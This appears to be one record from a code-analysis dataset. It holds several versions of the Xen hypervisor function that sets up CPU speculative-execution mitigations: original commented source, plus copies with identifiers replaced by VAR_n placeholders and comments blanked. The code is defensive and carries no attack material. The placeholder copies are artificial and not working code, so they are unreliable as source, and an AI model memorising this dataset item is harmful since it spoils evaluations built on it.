if ( opt_tsx == -1 && cpu_has_bug_taa && cpu_has_tsx_ctrl &&
((hw_smt_enabled && opt_smt) ||
!boot_cpu_has(X86_FEATURE_SC_VERW_IDLE)) )
{
opt_tsx = 0;
tsx_init();
}
if ( cpu_has_srbds_ctrl )
{
if ( opt_srb_lock == -1 && !opt_unpriv_mmio &&
cpu_has_mds_no && !cpu_has_taa_no &&
(!cpu_has_hle || (cpu_has_tsx_ctrl && rtm_disabled)) )
opt_srb_lock = 0;
set_in_mcu_opt_ctrl(MCU_OPT_CTRL_RNGDS_MITG_DIS,
opt_srb_lock ? 0 : MCU_OPT_CTRL_RNGDS_MITG_DIS);
}
print_details(thunk);
if ( has_spec_ctrl )
{
struct cpu_info *info = get_cpu_info();
unsigned int val;
bsp_delay_spec_ctrl = !cpu_has_hypervisor && default_xen_spec_ctrl;
if ( bsp_delay_spec_ctrl )
{
info->shadow_spec_ctrl = 0;
barrier();
info->spec_ctrl_flags |= SCF_use_shadow;
barrier();
}
val = bsp_delay_spec_ctrl ? 0 : default_xen_spec_ctrl;
wrmsrl(MSR_SPEC_CTRL, val);
info->last_spec_ctrl = val;
}
}","void __init init_speculation_mitigations(void)
{
enum ind_thunk VAR_0 = VAR_1;
bool VAR_2, VAR_3 = false, VAR_4;
bool VAR_5, VAR_6;
VAR_4 = check_smt_enabled();
VAR_2 = (boot_cpu_has(VAR_7) ||
boot_cpu_has(VAR_8));
if ( read_cr4() & VAR_9 )
{
if ( !VAR_2 )
{
printk(XENLOG_WARNING ""?!? CET active, but no MSR_SPEC_CTRL?\n"");
add_taint(VAR_10);
}
else if ( VAR_11 == -1 )
VAR_11 = VAR_3 = true;
if ( VAR_12 == VAR_1 || VAR_12 == VAR_13 )
VAR_0 = VAR_14;
}
VAR_6 = retpoline_calculations();
if ( VAR_12 != VAR_1 || VAR_11 != -1 )
{
VAR_0 = VAR_12;
VAR_3  = !!VAR_11;
}
else
{
if ( IS_ENABLED(VAR_15) )
{
if ( VAR_6 )
VAR_0 = VAR_13;
else if ( VAR_2 )
VAR_3 = true;
}
else if ( VAR_2 )
VAR_3 = true;
}
if ( !IS_ENABLED(VAR_15) )
VAR_0 = VAR_16;
if ( VAR_3 && VAR_0 == VAR_1 )
VAR_0 = VAR_14;
if ( VAR_0 == VAR_1 )
VAR_0 = VAR_13;
if ( VAR_0 == VAR_17 )
setup_force_cpu_cap(VAR_18);
else if ( VAR_0 == VAR_14 )
setup_force_cpu_cap(VAR_19);
if ( boot_cpu_has(VAR_7) )
{
if ( VAR_20 )
{
VAR_21 |= VAR_22;
setup_force_cpu_cap(VAR_23);
}
if ( VAR_24 )
{
VAR_21 |= VAR_22;
setup_force_cpu_cap(VAR_25);
}
}
if ( boot_cpu_has(VAR_8) )
{
if ( VAR_24 &&
(VAR_26.extended_cpuid_level >= 0x8000000a) &&
(cpuid_edx(0x8000000a) & (1u << VAR_27)) )
setup_force_cpu_cap(VAR_25);
}
if ( VAR_24 && !VAR_28 &&
(VAR_29 || (VAR_30 && amd_setup_legacy_ssbd())) )
VAR_31 = true;
if ( VAR_2 && VAR_3 )
{
if ( VAR_32 == -1 )
VAR_32 = 1;
VAR_33 |= VAR_34;
}
if ( VAR_32 == -1 )
VAR_32 = !!boot_cpu_has(VAR_35);
if ( VAR_32 && (boot_cpu_has(VAR_36) ||
boot_cpu_has(VAR_35)) )
VAR_33 |= VAR_37;
if ( VAR_38 && (boot_cpu_has(VAR_39) ||
boot_cpu_has(VAR_40)) )
{
if ( VAR_41 == -1 )
VAR_41 = 1;
VAR_33 |= VAR_42;
}
if ( VAR_41 == -1 )
VAR_41 = 0;
if ( VAR_41 && (boot_cpu_has(VAR_43) ||
boot_cpu_has(VAR_44)) )
VAR_33 |= VAR_45;
BUILD_BUG_ON(VAR_46 != PML4_ADDR(256));
if ( VAR_47 == -1 )
{
VAR_47 = (VAR_48 || !boot_cpu_has(VAR_49) ||
!rsb_is_full_width());
if ( !VAR_47 && VAR_4 &&
(VAR_26.x86_vendor & (VAR_50|VAR_51)) &&
(VAR_26.x86 == 0x17 || VAR_26.x86 == 0x18) )
setup_force_cpu_cap(VAR_52);
}
if ( VAR_47 )
{
setup_force_cpu_cap(VAR_53);
VAR_21 |= VAR_54;
}
if ( VAR_55 )
{
setup_force_cpu_cap(VAR_56);
if ( !VAR_57 )
VAR_21 |= VAR_54;
}
ibpb_calculations();
if ( VAR_58 == -1 )
VAR_58 = should_use_eager_fpu();
init_shadow_spec_ctrl_state();
if ( boot_cpu_has(VAR_7) && !VAR_59 &&
VAR_4 && VAR_33 )
setup_force_cpu_cap(VAR_60);
xpti_init_default();
l1tf_calculations();
if ( VAR_61 == -1 )
VAR_61 = 0;
if ( VAR_62 == -1 )
VAR_62 = !VAR_63 && VAR_64;
if ( !boot_cpu_has(VAR_65) )
VAR_66 = 0;
else if ( VAR_66 == -1 )
VAR_66 = VAR_64 && !VAR_67;
if ( !VAR_68 )
setup_force_cpu_cap(VAR_69);
if ( VAR_70 == -1 && VAR_64 && !VAR_63 && VAR_4 )
warning_add(
""Booted on L1TF-vulnerable hardware with SMT/Hyperthreading\n""
""enabled.  Please assess your configuration and choose an\n""
""explicit 'smt=<bool>' setting.  See XSA-273.\n"");
mds_calculations();
if ( VAR_71 )
VAR_72 = VAR_73;
if ( VAR_74 == -1 )
VAR_74 = ((VAR_75 || VAR_76) &&
boot_cpu_has(VAR_77));
if ( VAR_78 == -1 )
VAR_78 = ((VAR_75 || VAR_76) &&
boot_cpu_has(VAR_77));
if ( VAR_74 || VAR_78 || VAR_72 )
setup_force_cpu_cap(VAR_79);
VAR_78 &= !VAR_67 && !VAR_66;
if ( VAR_70 == -1 && VAR_75 && VAR_4 )
warning_add(
""Booted on MLPDS/MFBDS-vulnerable hardware with SMT/Hyperthreading\n""
""enabled.  Mitigations will not be fully effective.  Please\n""
""choose an explicit smt=<bool> setting.  See XSA-297.\n"");
VAR_5 =
(VAR_80 || VAR_81) && VAR_82 && !VAR_83;
if ( VAR_84 == -1 && VAR_5 && VAR_81 &&
((VAR_4 && VAR_70) ||
!boot_cpu_has(VAR_79)) )
{
VAR_84 = 0;
tsx_init();
}
if ( VAR_85 )
{
if ( VAR_86 == -1 && !VAR_71 &&
VAR_82 && !VAR_83 &&
(!VAR_87 || (VAR_81 && VAR_88)) )
VAR_86 = 0;
set_in_mcu_opt_ctrl(VAR_89,
VAR_86 ? 0 : VAR_89);
}
print_details(VAR_0);
if ( VAR_2 )
{
struct cpu_info *VAR_90 = get_cpu_info();
unsigned int VAR_91;
VAR_92 = !VAR_93 && VAR_33;
if ( VAR_92 )
{
VAR_90->shadow_spec_ctrl = 0;
barrier();
VAR_90->spec_ctrl_flags |= VAR_94;
barrier();
}
VAR_91 = VAR_92 ? 0 : VAR_33;
wrmsrl(VAR_95, VAR_91);
VAR_90->last_spec_ctrl = VAR_91;
}
}",,"void __init init_speculation_mitigations(void)
{
    enum ind_thunk thunk = THUNK_DEFAULT;
    bool has_spec_ctrl, ibrs = false, hw_smt_enabled;
    bool cpu_has_bug_taa, retpoline_safe;

    hw_smt_enabled = check_smt_enabled();

    has_spec_ctrl = (boot_cpu_has(X86_FEATURE_IBRSB) ||
                     boot_cpu_has(X86_FEATURE_IBRS));

    /*
     * First, disable the use of retpolines if Xen is using CET.  Retpolines
     * are a ROP gadget so incompatbile with Shadow Stacks, while IBT depends
     * on executing indirect branches for the safety properties to apply.
     *
     * In the absence of retpolines, IBRS needs to be used for speculative
     * safety.  All CET-capable hardware has efficient IBRS.
     */
    if ( read_cr4() & X86_CR4_CET )
    {
        if ( !has_spec_ctrl )
        {
            printk(XENLOG_WARNING ""?!? CET active, but no MSR_SPEC_CTRL?\n"");
            add_taint(TAINT_CPU_OUT_OF_SPEC);
        }
        else if ( opt_ibrs == -1 )
            opt_ibrs = ibrs = true;

        if ( opt_thunk == THUNK_DEFAULT || opt_thunk == THUNK_RETPOLINE )
            thunk = THUNK_JMP;
    }

    /* Determine if retpoline is safe on this CPU.  Fix up RSBA/RRSBA enumerations. */
    retpoline_safe = retpoline_calculations();

    /*
     * Has the user specified any custom BTI mitigations?  If so, follow their
     * instructions exactly and disable all heuristics.
     */
    if ( opt_thunk != THUNK_DEFAULT || opt_ibrs != -1 )
    {
        thunk = opt_thunk;
        ibrs  = !!opt_ibrs;
    }
    else
    {
        /*
         * Evaluate the safest Branch Target Injection mitigations to use.
         * First, begin with compiler-aided mitigations.
         */
        if ( IS_ENABLED(CONFIG_INDIRECT_THUNK) )
        {
            /*
             * On all hardware, we'd like to use retpoline in preference to
             * IBRS, but only if it is safe on this hardware.
             */
            if ( retpoline_safe )
                thunk = THUNK_RETPOLINE;
            else if ( has_spec_ctrl )
                ibrs = true;
        }
        /* Without compiler thunk support, use IBRS if available. */
        else if ( has_spec_ctrl )
            ibrs = true;
    }

    /*
     * Supplimentary minor adjustments.  Without compiler support, there are
     * no thunks.
     */
    if ( !IS_ENABLED(CONFIG_INDIRECT_THUNK) )
        thunk = THUNK_NONE;

    /*
     * If IBRS is in use and thunks are compiled in, there is no point
     * suffering extra overhead.  Switch to the least-overhead thunk.
     */
    if ( ibrs && thunk == THUNK_DEFAULT )
        thunk = THUNK_JMP;

    /*
     * If there are still no thunk preferences, the compiled default is
     * actually retpoline, and it is better than nothing.
     */
    if ( thunk == THUNK_DEFAULT )
        thunk = THUNK_RETPOLINE;

    /* Apply the chosen settings. */
    if ( thunk == THUNK_LFENCE )
        setup_force_cpu_cap(X86_FEATURE_IND_THUNK_LFENCE);
    else if ( thunk == THUNK_JMP )
        setup_force_cpu_cap(X86_FEATURE_IND_THUNK_JMP);

    /* Intel hardware: MSR_SPEC_CTRL alternatives setup. */
    if ( boot_cpu_has(X86_FEATURE_IBRSB) )
    {
        if ( opt_msr_sc_pv )
        {
            default_spec_ctrl_flags |= SCF_ist_sc_msr;
            setup_force_cpu_cap(X86_FEATURE_SC_MSR_PV);
        }

        if ( opt_msr_sc_hvm )
        {
            /*
             * While the guest MSR_SPEC_CTRL value is loaded/saved atomically,
             * Xen's value is not restored atomically.  An early NMI hitting
             * the VMExit path needs to restore Xen's value for safety.
             */
            default_spec_ctrl_flags |= SCF_ist_sc_msr;
            setup_force_cpu_cap(X86_FEATURE_SC_MSR_HVM);
        }
    }

    /* AMD hardware: MSR_SPEC_CTRL alternatives setup. */
    if ( boot_cpu_has(X86_FEATURE_IBRS) )
    {
        /*
         * Virtualising MSR_SPEC_CTRL for guests depends on SVM support, which
         * on real hardware matches the availability of MSR_SPEC_CTRL in the
         * first place.
         *
         * No need for SCF_ist_sc_msr because Xen's value is restored
         * atomically WRT NMIs in the VMExit path.
         *
         * TODO: Adjust cpu_has_svm_spec_ctrl to be usable earlier on boot.
         */
        if ( opt_msr_sc_hvm &&
             (boot_cpu_data.extended_cpuid_level >= 0x8000000a) &&
             (cpuid_edx(0x8000000a) & (1u << SVM_FEATURE_SPEC_CTRL)) )
            setup_force_cpu_cap(X86_FEATURE_SC_MSR_HVM);
    }

    /* Support VIRT_SPEC_CTRL.SSBD if AMD_SSBD is not available. */
    if ( opt_msr_sc_hvm && !cpu_has_amd_ssbd &&
         (cpu_has_virt_ssbd || (amd_legacy_ssbd && amd_setup_legacy_ssbd())) )
        amd_virt_spec_ctrl = true;

    /* Figure out default_xen_spec_ctrl. */
    if ( has_spec_ctrl && ibrs )
    {
        /* IBRS implies STIBP.  */
        if ( opt_stibp == -1 )
            opt_stibp = 1;

        default_xen_spec_ctrl |= SPEC_CTRL_IBRS;
    }

    /*
     * Use STIBP by default on all AMD systems.  Zen3 and later enumerate
     * STIBP_ALWAYS, but STIBP is needed on Zen2 as part of the mitigations
     * for Branch Type Confusion.
     *
     * Leave STIBP off by default on Intel.  Pre-eIBRS systems suffer a
     * substantial perf hit when it was implemented in microcode.
     */
    if ( opt_stibp == -1 )
        opt_stibp = !!boot_cpu_has(X86_FEATURE_AMD_STIBP);

    if ( opt_stibp && (boot_cpu_has(X86_FEATURE_STIBP) ||
                       boot_cpu_has(X86_FEATURE_AMD_STIBP)) )
        default_xen_spec_ctrl |= SPEC_CTRL_STIBP;

    if ( opt_ssbd && (boot_cpu_has(X86_FEATURE_SSBD) ||
                      boot_cpu_has(X86_FEATURE_AMD_SSBD)) )
    {
        /* SSBD implies PSFD */
        if ( opt_psfd == -1 )
            opt_psfd = 1;

        default_xen_spec_ctrl |= SPEC_CTRL_SSBD;
    }

    /*
     * Don't use PSFD by default.  AMD designed the predictor to
     * auto-clear on privilege change.  PSFD is implied by SSBD, which is
     * off by default.
     */
    if ( opt_psfd == -1 )
        opt_psfd = 0;

    if ( opt_psfd && (boot_cpu_has(X86_FEATURE_PSFD) ||
                      boot_cpu_has(X86_FEATURE_INTEL_PSFD)) )
        default_xen_spec_ctrl |= SPEC_CTRL_PSFD;

    /*
     * PV guests can create RSB entries for any linear address they control,
     * which are outside of Xen's mappings.
     *
     * SMEP inhibits speculation to any user mappings, so in principle it is
     * safe to not overwrite the RSB when SMEP is active.
     *
     * However, some caveats apply:
     *
     * 1) CALL instructions push the next sequential linear address into the
     *    RSB, meaning that there is a boundary case at the user=>supervisor
     *    split.  This can be compensated for by having an unmapped or NX
     *    page, or an instruction which halts speculation.
     *
     *    For Xen, the next sequential linear address is the start of M2P
     *    (mapped NX), or a zapped hole (unmapped).
     *
     * 2) 32bit PV kernels execute in Ring 1 and use supervisor mappings.
     *    SMEP offers no protection in this case.
     *
     * 3) Some CPUs have RSBs which are not full width, which allow the
     *    attacker's entries to alias Xen addresses.
     *
     * 4) Some CPUs have RSBs which are re-partitioned based on thread
     *    idleness, which allows an attacker to inject entries into the other
     *    thread.  We still active the optimisation in this case, and mitigate
     *    in the idle path which has lower overhead.
     *
     * It is safe to turn off RSB stuffing when Xen is using SMEP itself, and
     * 32bit PV guests are disabled, and when the RSB is full width.
     */
    BUILD_BUG_ON(RO_MPT_VIRT_START != PML4_ADDR(256));
    if ( opt_rsb_pv == -1 )
    {
        opt_rsb_pv = (opt_pv32 || !boot_cpu_has(X86_FEATURE_XEN_SMEP) ||
                      !rsb_is_full_width());

        /*
         * Cross-Thread Return Address Predictions.
         *
         * Vulnerable systems are Zen1/Zen2 uarch, which is AMD Fam17 / Hygon
         * Fam18, when SMT is active.
         *
         * To mitigate, we must flush the RSB/RAS/RAP once between entering
         * Xen and going idle.
         *
         * Most cases flush on entry to Xen anyway.  The one case where we
         * don't is when using the SMEP optimisation for PV guests.  Flushing
         * before going idle is less overhead than flushing on PV entry.
         */
        if ( !opt_rsb_pv && hw_smt_enabled &&
             (boot_cpu_data.x86_vendor & (X86_VENDOR_AMD|X86_VENDOR_HYGON)) &&
             (boot_cpu_data.x86 == 0x17 || boot_cpu_data.x86 == 0x18) )
            setup_force_cpu_cap(X86_FEATURE_SC_RSB_IDLE);
    }

    if ( opt_rsb_pv )
    {
        setup_force_cpu_cap(X86_FEATURE_SC_RSB_PV);
        default_spec_ctrl_flags |= SCF_ist_rsb;
    }

    /*
     * HVM guests can always poison the RSB to point at Xen supervisor
     * mappings.
     */
    if ( opt_rsb_hvm )
    {
        setup_force_cpu_cap(X86_FEATURE_SC_RSB_HVM);

        /*
         * For SVM, Xen's RSB safety actions are performed before STGI, so
         * behave atomically with respect to IST sources.
         *
         * For VT-x, NMIs are atomic with VMExit (the NMI gets queued but not
         * delivered) whereas other IST sources are not atomic.  Specifically,
         * #MC can hit ahead the RSB safety action in the vmexit path.
         *
         * Therefore, it is necessary for the IST logic to protect Xen against
         * possible rogue RSB speculation.
         */
        if ( !cpu_has_svm )
            default_spec_ctrl_flags |= SCF_ist_rsb;
    }

    srso_calculations(hw_smt_enabled);

    ibpb_calculations();

    /* Check whether Eager FPU should be enabled by default. */
    if ( opt_eager_fpu == -1 )
        opt_eager_fpu = should_use_eager_fpu();

    /* (Re)init BSP state now that default_spec_ctrl_flags has been calculated. */
    init_shadow_spec_ctrl_state();

    /*
     * For microcoded IBRS only (i.e. Intel, pre eIBRS), it is recommended to
     * clear MSR_SPEC_CTRL before going idle, to avoid impacting sibling
     * threads.  Activate this if SMT is enabled, and Xen is using a non-zero
     * MSR_SPEC_CTRL setting.
     */
    if ( boot_cpu_has(X86_FEATURE_IBRSB) && !cpu_has_eibrs &&
         hw_smt_enabled && default_xen_spec_ctrl )
        setup_force_cpu_cap(X86_FEATURE_SC_MSR_IDLE);

    xpti_init_default();

    l1tf_calculations();

    /*
     * By default, enable PV domU L1TF mitigations on all L1TF-vulnerable
     * hardware, except when running in shim mode.
     *
     * In shim mode, SHADOW is expected to be compiled out, and a malicious
     * guest kernel can only attack the shim Xen, not the host Xen.
     */
    if ( opt_pv_l1tf_hwdom == -1 )
        opt_pv_l1tf_hwdom = 0;
    if ( opt_pv_l1tf_domu == -1 )
        opt_pv_l1tf_domu = !pv_shim && cpu_has_bug_l1tf;

    /*
     * By default, enable L1D_FLUSH on L1TF-vulnerable hardware, unless
     * instructed to skip the flush on vmentry by our outer hypervisor.
     */
    if ( !boot_cpu_has(X86_FEATURE_L1D_FLUSH) )
        opt_l1d_flush = 0;
    else if ( opt_l1d_flush == -1 )
        opt_l1d_flush = cpu_has_bug_l1tf && !cpu_has_skip_l1dfl;

    /* We compile lfence's in by default, and nop them out if requested. */
    if ( !opt_branch_harden )
        setup_force_cpu_cap(X86_FEATURE_SC_NO_BRANCH_HARDEN);

    /*
     * We do not disable HT by default on affected hardware.
     *
     * Firstly, if the user intends to use exclusively PV, or HVM shadow
     * guests, HT isn't a concern and should remain fully enabled.  Secondly,
     * safety for HVM HAP guests can be arranged by the toolstack with core
     * parking, pinning or cpupool configurations, including mixed setups.
     *
     * However, if we are on affected hardware, with HT enabled, and the user
     * hasn't explicitly chosen whether to use HT or not, nag them to do so.
     */
    if ( opt_smt == -1 && cpu_has_bug_l1tf && !pv_shim && hw_smt_enabled )
        warning_add(
            ""Booted on L1TF-vulnerable hardware with SMT/Hyperthreading\n""
            ""enabled.  Please assess your configuration and choose an\n""
            ""explicit 'smt=<bool>' setting.  See XSA-273.\n"");

    mds_calculations();

    /*
     * Parts which enumerate FB_CLEAR are those which are post-MDS_NO and have
     * reintroduced the VERW fill buffer flushing side effect because of a
     * susceptibility to FBSDP.
     *
     * If unprivileged guests have (or will have) MMIO mappings, we can
     * mitigate cross-domain leakage of fill buffer data by issuing VERW on
     * the return-to-guest path.
     */
    if ( opt_unpriv_mmio )
        opt_fb_clear_mmio = cpu_has_fb_clear;

    /*
     * By default, enable PV and HVM mitigations on MDS-vulnerable hardware.
     * This will only be a token effort for MLPDS/MFBDS when HT is enabled,
     * but it is somewhat better than nothing.
     */
    if ( opt_md_clear_pv == -1 )
        opt_md_clear_pv = ((cpu_has_bug_mds || cpu_has_bug_msbds_only) &&
                           boot_cpu_has(X86_FEATURE_MD_CLEAR));
    if ( opt_md_clear_hvm == -1 )
        opt_md_clear_hvm = ((cpu_has_bug_mds || cpu_has_bug_msbds_only) &&
                            boot_cpu_has(X86_FEATURE_MD_CLEAR));

    /*
     * Enable MDS/MMIO defences as applicable.  The Idle blocks need using if
     * either the PV or HVM MDS defences are used, or if we may give MMIO
     * access to untrusted guests.
     *
     * HVM is more complicated.  The MD_CLEAR microcode extends L1D_FLUSH with
     * equivalent semantics to avoid needing to perform both flushes on the
     * HVM path.  Therefore, we don't need VERW in addition to L1D_FLUSH (for
     * MDS mitigations.  L1D_FLUSH is not safe for MMIO mitigations.)
     *
     * After calculating the appropriate idle setting, simplify
     * opt_md_clear_hvm to mean just ""should we VERW on the way into HVM
     * guests"", so spec_ctrl_init_domain() can calculate suitable settings.
     */
    if ( opt_md_clear_pv || opt_md_clear_hvm || opt_fb_clear_mmio )
        setup_force_cpu_cap(X86_FEATURE_SC_VERW_IDLE);
    opt_md_clear_hvm &= !cpu_has_skip_l1dfl && !opt_l1d_flush;

    /*
     * Warn the user if they are on MLPDS/MFBDS-vulnerable hardware with HT
     * active and no explicit SMT choice.
     */
    if ( opt_smt == -1 && cpu_has_bug_mds && hw_smt_enabled )
        warning_add(
            ""Booted on MLPDS/MFBDS-vulnerable hardware with SMT/Hyperthreading\n""
            ""enabled.  Mitigations will not be fully effective.  Please\n""
            ""choose an explicit smt=<bool> setting.  See XSA-297.\n"");

    /*
     * Vulnerability to TAA is a little complicated to quantify.
     *
     * In the pipeline, it is just another way to get speculative access to
     * stale load port, store buffer or fill buffer data, and therefore can be
     * considered a superset of MDS (on TSX-capable parts).  On parts which
     * predate MDS_NO, the existing VERW flushing will mitigate this
     * sidechannel as well.
     *
     * On parts which contain MDS_NO, the lack of VERW flushing means that an
     * attacker can still use TSX to target microarchitectural buffers to leak
     * secrets.  Therefore, we consider TAA to be the set of TSX-capable parts
     * which have MDS_NO but lack TAA_NO.
     *
     * Note: cpu_has_rtm (== hle) could already be hidden by `tsx=0` on the
     *       cmdline.  MSR_TSX_CTRL will only appear on TSX-capable parts, so
     *       we check both to spot TSX in a microcode/cmdline independent way.
     */
    cpu_has_bug_taa =
        (cpu_has_rtm || cpu_has_tsx_ctrl) && cpu_has_mds_no && !cpu_has_taa_no;

    /*
     * On TAA-affected hardware, disabling TSX is the preferred mitigation, vs
     * the MDS mitigation of disabling HT and using VERW flushing.
     *
     * On CPUs which advertise MDS_NO, VERW has no flushing side effect until
     * the TSX_CTRL microcode (Nov 2019), despite the MD_CLEAR CPUID bit being
     * advertised, and there isn't a MD_CLEAR_2 flag to use...
     *
     * Furthermore, the VERW flushing side effect is removed again on client
     * parts with the Feb 2022 microcode.
     *
     * If we're on affected hardware, able to do something about it (which
     * implies that VERW might work), no explicit TSX choice and traditional
     * MDS mitigations (no-SMT, VERW) not obviosuly in use (someone might
     * plausibly value TSX higher than Hyperthreading...), disable TSX to
     * mitigate TAA.
     */
    if ( opt_tsx == -1 && cpu_has_bug_taa && cpu_has_tsx_ctrl &&
         ((hw_smt_enabled && opt_smt) ||
          !boot_cpu_has(X86_FEATURE_SC_VERW_IDLE)) )
    {
        opt_tsx = 0;
        tsx_init();
    }

    /*
     * On some SRBDS-affected hardware, it may be safe to relax srb-lock by
     * default.
     *
     * All parts with SRBDS_CTRL suffer SSDP, the mechanism by which stale RNG
     * data becomes available to other contexts.  To recover the data, an
     * attacker needs to use:
     *  - SBDS (MDS or TAA to sample the cores fill buffer)
     *  - SBDR (Architecturally retrieve stale transaction buffer contents)
     *  - DRPW (Architecturally latch stale fill buffer data)
     *
     * On MDS_NO parts, and with TAA_NO or TSX unavailable/disabled, and there
     * is no unprivileged MMIO access, the RNG data doesn't need protecting.
     */
    if ( cpu_has_srbds_ctrl )
    {
        if ( opt_srb_lock == -1 && !opt_unpriv_mmio &&
             cpu_has_mds_no && !cpu_has_taa_no &&
             (!cpu_has_hle || (cpu_has_tsx_ctrl && rtm_disabled)) )
            opt_srb_lock = 0;

        set_in_mcu_opt_ctrl(MCU_OPT_CTRL_RNGDS_MITG_DIS,
                            opt_srb_lock ? 0 : MCU_OPT_CTRL_RNGDS_MITG_DIS);
    }

    print_details(thunk);

    /*
     * If MSR_SPEC_CTRL is available, apply Xen's default setting and discard
     * any firmware settings.  For performance reasons, when safe to do so, we
     * delay applying non-zero settings until after dom0 has been constructed.
     *
     * ""when safe to do so"" is based on whether we are virtualised.  A native
     * boot won't have any other code running in a position to mount an
     * attack.
     */
    if ( has_spec_ctrl )
    {
        struct cpu_info *info = get_cpu_info();
        unsigned int val;

        bsp_delay_spec_ctrl = !cpu_has_hypervisor && default_xen_spec_ctrl;

        /*
         * If delaying MSR_SPEC_CTRL setup, use the same mechanism as
         * spec_ctrl_enter_idle(), by using a shadow value of zero.
         */
        if ( bsp_delay_spec_ctrl )
        {
            info->shadow_spec_ctrl = 0;
            barrier();
            info->spec_ctrl_flags |= SCF_use_shadow;
            barrier();
        }

        val = bsp_delay_spec_ctrl ? 0 : default_xen_spec_ctrl;

        wrmsrl(MSR_SPEC_CTRL, val);
        info->last_spec_ctrl = val;
    }
}","void __init init_speculation_mitigations(void)
{
    enum ind_thunk VAR_0 = VAR_1;
    bool VAR_2, VAR_3 = false, VAR_4;
    bool VAR_5, VAR_6;

    VAR_4 = check_smt_enabled();

    VAR_2 = (boot_cpu_has(VAR_7) ||
                     boot_cpu_has(VAR_8));

    /* COMMENT_0 */
                                                                            
                                                                             
                                                                         
      
                                                                          
                                                            
       
    if ( read_cr4() & VAR_9 )
    {
        if ( !VAR_2 )
        {
            printk(XENLOG_WARNING ""?!? CET active, but no MSR_SPEC_CTRL?\n"");
            add_taint(VAR_10);
        }
        else if ( VAR_11 == -1 )
            VAR_11 = VAR_3 = true;

        if ( VAR_12 == VAR_1 || VAR_12 == VAR_13 )
            VAR_0 = VAR_14;
    }

    /* COMMENT_8 */
    VAR_6 = retpoline_calculations();

    /* COMMENT_9 */
                                                                              
                                                       
       
    if ( VAR_12 != VAR_1 || VAR_11 != -1 )
    {
        VAR_0 = VAR_12;
        VAR_3  = !!VAR_11;
    }
    else
    {
        /* COMMENT_13 */
                                                                          
                                                        
           
        if ( IS_ENABLED(VAR_15) )
        {
            /* COMMENT_17 */
                                                                           
                                                             
               
            if ( VAR_6 )
                VAR_0 = VAR_13;
            else if ( VAR_2 )
                VAR_3 = true;
        }
        /* COMMENT_21 */
        else if ( VAR_2 )
            VAR_3 = true;
    }

    /* COMMENT_22 */
                                                                            
                 
       
    if ( !IS_ENABLED(VAR_15) )
        VAR_0 = VAR_16;

    /* COMMENT_26 */
                                                                      
                                                                     
       
    if ( VAR_3 && VAR_0 == VAR_1 )
        VAR_0 = VAR_14;

    /* COMMENT_30 */
                                                                       
                                                         
       
    if ( VAR_0 == VAR_1 )
        VAR_0 = VAR_13;

    /* COMMENT_34 */
    if ( VAR_0 == VAR_17 )
        setup_force_cpu_cap(VAR_18);
    else if ( VAR_0 == VAR_14 )
        setup_force_cpu_cap(VAR_19);

    /* COMMENT_35 */
    if ( boot_cpu_has(VAR_7) )
    {
        if ( VAR_20 )
        {
            VAR_21 |= VAR_22;
            setup_force_cpu_cap(VAR_23);
        }

        if ( VAR_24 )
        {
            /* COMMENT_36 */
                                                                              
                                                                            
                                                                       
               
            VAR_21 |= VAR_22;
            setup_force_cpu_cap(VAR_25);
        }
    }

    /* COMMENT_41 */
    if ( boot_cpu_has(VAR_8) )
    {
        /* COMMENT_42 */
                                                                              
                                                                            
                       
          
                                                                     
                                                  
          
                                                                           
           
        if ( VAR_24 &&
             (VAR_26.extended_cpuid_level >= 0x8000000a) &&
             (cpuid_edx(0x8000000a) & (1u << VAR_27)) )
            setup_force_cpu_cap(VAR_25);
    }

    /* COMMENT_51 */
    if ( VAR_24 && !VAR_28 &&
         (VAR_29 || (VAR_30 && amd_setup_legacy_ssbd())) )
        VAR_31 = true;

    /* COMMENT_52 */
    if ( VAR_2 && VAR_3 )
    {
        /* COMMENT_53 */
        if ( VAR_32 == -1 )
            VAR_32 = 1;

        VAR_33 |= VAR_34;
    }

    /* COMMENT_54 */
                                                                         
                                                                           
                                 
      
                                                                       
                                                                 
       
    if ( VAR_32 == -1 )
        VAR_32 = !!boot_cpu_has(VAR_35);

    if ( VAR_32 && (boot_cpu_has(VAR_36) ||
                       boot_cpu_has(VAR_35)) )
        VAR_33 |= VAR_37;

    if ( VAR_38 && (boot_cpu_has(VAR_39) ||
                      boot_cpu_has(VAR_40)) )
    {
        /* COMMENT_62 */
        if ( VAR_41 == -1 )
            VAR_41 = 1;

        VAR_33 |= VAR_42;
    }

    /* COMMENT_63 */
                                                                
                                                                         
                      
       
    if ( VAR_41 == -1 )
        VAR_41 = 0;

    if ( VAR_41 && (boot_cpu_has(VAR_43) ||
                      boot_cpu_has(VAR_44)) )
        VAR_33 |= VAR_45;

    /* COMMENT_68 */
                                                                            
                                           
      
                                                                            
                                                         
      
                                   
      
                                                                            
                                                                            
                                                                         
                                                          
      
                                                                         
                                                   
      
                                                                         
                                                 
      
                                                                       
                                                    
      
                                                                      
                                                                             
                                                                              
                                                    
      
                                                                             
                                                                    
       
    BUILD_BUG_ON(VAR_46 != PML4_ADDR(256));
    if ( VAR_47 == -1 )
    {
        VAR_47 = (VAR_48 || !boot_cpu_has(VAR_49) ||
                      !rsb_is_full_width());

        /* COMMENT_92 */
                                                   
          
                                                                             
                                     
          
                                                                           
                              
          
                                                                          
                                                                             
                                                                        
           
        if ( !VAR_47 && VAR_4 &&
             (VAR_26.x86_vendor & (VAR_50|VAR_51)) &&
             (VAR_26.x86 == 0x17 || VAR_26.x86 == 0x18) )
            setup_force_cpu_cap(VAR_52);
    }

    if ( VAR_47 )
    {
        setup_force_cpu_cap(VAR_53);
        VAR_21 |= VAR_54;
    }

    /* COMMENT_103 */
                                                                      
                
       
    if ( VAR_55 )
    {
        setup_force_cpu_cap(VAR_56);

        /* COMMENT_107 */
                                                                          
                                                         
          
                                                                             
                                                                              
                                                                      
          
                                                                              
                                          
           
        if ( !VAR_57 )
            VAR_21 |= VAR_54;
    }

    srso_calculations(VAR_4);

    ibpb_calculations();

    /* COMMENT_117 */
    if ( VAR_58 == -1 )
        VAR_58 = should_use_eager_fpu();

    /* COMMENT_118 */
    init_shadow_spec_ctrl_state();

    /* COMMENT_119 */
                                                                             
                                                                        
                                                                             
                             
       
    if ( boot_cpu_has(VAR_7) && !VAR_59 &&
         VAR_4 && VAR_33 )
        setup_force_cpu_cap(VAR_60);

    xpti_init_default();

    l1tf_calculations();

    /* COMMENT_125 */
                                                                         
                                                  
      
                                                                           
                                                                   
       
    if ( VAR_61 == -1 )
        VAR_61 = 0;
    if ( VAR_62 == -1 )
        VAR_62 = !VAR_63 && VAR_64;

    /* COMMENT_132 */
                                                                       
                                                                       
       
    if ( !boot_cpu_has(VAR_65) )
        VAR_66 = 0;
